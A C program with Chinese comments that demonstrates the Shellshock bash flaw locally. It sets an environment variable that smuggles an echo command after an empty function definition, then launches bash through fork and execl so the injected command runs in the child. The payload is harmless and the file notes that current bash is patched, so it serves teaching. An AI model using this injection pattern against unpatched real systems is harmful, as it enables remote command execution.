#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>

int main() {
    printf("--- Shellshock 本地概念验证程序 ---\n\n");

    // 1. 构造恶意的环境变量
    // 格式为： "() { <函数体>; }; <要执行的恶意命令>"
    // 这里我们定义一个空函数体 ":"，然后跟着一个 echo 命令
    const char* malicious_env = "VULN_VAR=() { :; }; echo [子进程说]: 我被控制了，这是一个远程代码执行漏洞！";
    
    printf("[父进程] 准备设置恶意环境变量:\n  %s\n\n", malicious_env);

    // 2. 使用 putenv() 将该字符串放入当前进程的环境中
    // putenv 是一个库函数，它会修改将要传递给子进程的环境变量列表
    // 注意: putenv需要一个指向堆或静态区的指针，所以我们用strdup复制
    char* env_string = strdup(malicious_env);
    if (putenv(env_string) != 0) {
        perror("putenv");
        exit(1);
    }

    printf("[父进程] 正在通过 fork() + execl() 启动一个易受攻击的bash子进程...\n");
    printf("子进程将继承我们的环境变量。\n\n");

    // === 系统调用: fork ===
    // 创建一个子进程
    pid_t pid = fork();
    if (pid == -1) {
        perror("fork");
        exit(1);
    }

    if (pid == 0) {
        // --- 子进程空间 ---
        // 3. === 系统调用: execle ===
        // 启动一个新的bash程序。bash启动时会自动解析它继承的环境变量。
        // execle 的最后一个参数是环境，但我们这里让它继承父进程的环境，putenv已经设定好了。
        // 我们在这里执行一个简单的bash命令，仅仅是为了启动bash这个程序。
        // 漏洞在bash启动并处理VULN_VAR时被触发。
        execl("/bin/bash", "bash", "-c", "echo [子进程说]: 我的正常任务是输出这句话。", NULL);
        
        // 如果execl成功，下面的代码不会被执行
        perror("execl");
        exit(1);
    } else {
        // --- 父进程空间 ---
        wait(NULL); // 等待子进程结束
        printf("\n[父进程] 子进程已结束。\n");
        printf("分析：如果看到上面有两行'[子进程说]'的输出，特别是那行'我被控制了'，\n");
        printf("就证明了Shellshock漏洞被成功触发。父进程只要求子进程输出一行话，\n");
        printf("但恶意环境变量让它额外执行了我们注入的命令。\n");
        printf("但由于现代bash已修复此漏洞，故只会输出一行话。\n");
    }

    // 虽然 putenv 要求指针稳定，但在程序结束前可以释放
    // 实际上更安全的做法是不释放，或者使用 setenv
    // free(env_string); 

    return 0;
}